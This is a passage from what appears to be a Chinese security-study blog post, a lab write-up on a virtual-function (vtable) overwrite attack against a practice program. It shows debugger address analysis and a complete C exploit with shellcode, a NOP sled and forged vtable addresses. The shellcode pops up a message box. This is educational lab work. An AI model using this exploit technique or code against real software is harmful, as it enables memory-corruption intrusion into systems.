+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852252563.png" alt="1565852252563"></p>
+</li>
+<li><p>运行程序至两个断点处，观察右下角缓冲区数据，得到<code>dest1</code>的地址为<code>0x0042EB5C</code>，<code>dest2</code>的地址为<code>0x42EB14</code></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852281949.png" alt="1565852281949"></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852289720.png" alt="1565852289720"></p>
+</li>
+<li><p>在数据窗口中追踪<code>dest1</code>的地址，为<code>0x0042801C</code></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852318989.png" alt="1565852318989"></p>
+</li>
+<li><p>之前分析<code>dword_42EB08</code>是对象开头的指针，根据地址<code>0x0041195A</code>处的汇编代码<code>mov dword_42EB08,offset unk_42EB58</code>表明<code>0x0042EB58</code>处是对象开头的位置了。<code>0X0042EB58</code>刚好在<code>dest</code>地址<code>0X0042EB5C</code>之前说明了调用的函数是虚函数，虚表指针地址为<code>0x0042801C</code></p>
+</li>
+<li><p>仍然使用前面实验的<code>shellcode</code>和计算地址的办法，把这个地方覆盖为<code>shellcode</code>尾部的地址<code>0x0042EB5C+0xD8-0x4=0x0042EC30</code>，<code>shellcode</code>尾部再填上伪造的虚函数入口地址即可。由于于<code>dest1</code>的地址刚好在虚表指针地址之后，<code>dest2</code>的地址在虚表指针地址之前，用<code>dest2</code>的地址进行覆盖</p>
+</li>
+<li><p>编写shellcode如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode1[]=</span><br><span class="line"><span class="string">&quot;\x33\xDB\x53\x68\x31\x32\x33\x34\x68\x41\x42\x43\x44\x8B\xC4\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x50\x50\x53\xB8\x68\x3D\xE2\x77\xFF\xD0\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x5C\xEB\x42\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode2[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x30\xEC\x42\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">char</span> command[<span class="number">200</span>];</span><br><span class="line">	<span class="built_in">memset</span>(command,<span class="number">0</span>,<span class="keyword">sizeof</span>(command));</span><br><span class="line">	<span class="built_in">strcpy</span>(command,<span class="string">&quot;\&quot;C:\\vf.exe\&quot; &quot;</span>);</span><br><span class="line">	<span class="built_in">strcat</span>(command,shellcode1);</span><br><span class="line">	<span class="built_in">strcat</span>(command,<span class="string">&quot; &quot;</span>);</span><br><span class="line">	<span class="built_in">strcat</span>(command,shellcode2);</span><br><span class="line">	system(command);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>运行shellcode程序，成功弹出会话框</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852843165.png" alt="1565852843165"></p>
+</li>
+</ol>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>李钰璕
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://leeyuxun.github.io/%E8%99%9A%E5%87%BD%E6%95%B0%E6%94%BB%E5%87%BB%E5%92%8CSEH%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C.html" title="虚函数攻击和SEH攻击实验">https://leeyuxun.github.io/虚函数攻击和SEH攻击实验.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-cn" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E8%99%9A%E5%87%BD%E6%95%B0%E6%94%BB%E5%87%BB/" rel="tag"><i class="fa fa-tag"></i> 虚函数攻击</a>
+              <a href="/tags/SEH%E6%94%BB%E5%87%BB/" rel="tag"><i class="fa fa-tag"></i> SEH攻击</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C.html" rel="prev" title="漏洞技术利用实验">
+      <i class="fa fa-chevron-left"></i> 漏洞技术利用实验
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C.html" rel="next" title="漏洞挖掘与模糊测试实验">
+      漏洞挖掘与模糊测试实验 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84"><span class="nav-number">1.</span> <span class="nav-text">实验目的</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%90%86%E8%A7%A3%E7%A8%8B%E5%BA%8F"><span class="nav-number">2.</span> <span class="nav-text">理解程序</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B0%83%E8%AF%95SEH%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81"><span class="nav-number">3.</span> <span class="nav-text">调试SEH攻击代码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E8%99%9A%E5%87%BD%E6%95%B0%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81"><span class="nav-number">4.</span> <span class="nav-text">调试虚函数攻击代码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E7%BB%93%E8%AE%BA"><span class="nav-number">5.</span> <span class="nav-text">测试结论</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%9D%E8%80%83%E9%A2%98"><span class="nav-number">6.</span> <span class="nav-text">思考题</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="李钰璕"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">李钰璕</p>
+  <div class="site-description" itemprop="description">安全学习笔记</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">89</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">115</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Leeyuxun" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Leeyuxun" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:leeyuxun@163.com" title="E-Mail → mailto:leeyuxun@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <!--
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">李钰璕</span>
+</div>
+-->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
